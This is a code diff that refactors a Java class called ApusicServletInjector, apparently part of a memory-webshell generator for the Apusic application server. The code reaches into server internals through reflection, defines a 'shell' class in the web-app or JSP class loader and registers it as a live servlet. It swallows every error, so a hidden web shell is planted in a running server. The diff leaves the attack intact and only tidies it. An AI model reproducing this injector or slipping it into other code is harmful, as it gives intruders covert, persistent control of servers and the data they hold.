@@ -16,7 +16,7 @@ import java.util.zip.GZIPInputStream;
  */
 public class ApusicServletInjector {
 
-    private static boolean ok = false;
+    private static boolean ok;
 
     private static String shellClassName;
     private static String shellClass;
@@ -30,12 +30,11 @@ public class ApusicServletInjector {
             contexts = getContext();
         } catch (Throwable throwable) {
         }
-        if (contexts == null || contexts.isEmpty()) {
-        } else {
+        if (contexts != null) {
             for (Object context : contexts) {
                 try {
-                    Object shell = getShell(context);
-                    inject(context, shell);
+                    loadShell(context);
+                    inject(context);
 
                 } catch (Throwable e) {
                 }
@@ -66,27 +65,21 @@ public class ApusicServletInjector {
         return contexts;
     }
 
-    private Object getShell(Object context) throws Exception {
+    private void loadShell(Object context) throws Exception {
         // WebApp 类加载器，ServletContext 使用这个进行组件的类加载
         ClassLoader loader = (ClassLoader) getFieldValue(context, "loader");
-        ClassLoader defineLoader;
-        Object obj;
         try {
             // Apusic 9.0 SPX，优先从当前 loader 进行加载
             defineShell(loader);
             // 模拟组件初始化（尝试使用 WebApp 类加载器进行组件类实例化）
-            obj = loader.loadClass(shellClassName).newInstance();
-            defineLoader = loader;
+            loader.loadClass(shellClassName).newInstance();
         } catch (ClassNotFoundException e) {
             // Apusic 9.0.1，委托给 jspLoader 进行加载，因此直接往 loader 里面 define 会 ClassNotFound
             ClassLoader internalLoader = (ClassLoader) getFieldValue(getFieldValue(loader, "delegate"), "jspLoader");
             defineShell(internalLoader);
             // 模拟组件初始化（尝试使用 WebApp 类加载器进行组件类实例化）
-            obj = loader.loadClass(shellClassName).newInstance();
-            defineLoader = internalLoader;
+            loader.loadClass(shellClassName).newInstance();
         }
-
-        return obj;
     }
 
 
@@ -100,7 +93,7 @@ public class ApusicServletInjector {
         }
     }
 
-    public void inject(Object context, Object servlet) throws Exception {
+    private void inject(Object context) throws Exception {
         Object webModule = getFieldValue(context, "webapp");
         Object servletMapper = getFieldValue(context, "servletMapper");
         if (invokeMethod(webModule, "getServlet", new Class[]{String.class}, new Object[]{shellClassName}) != null) {
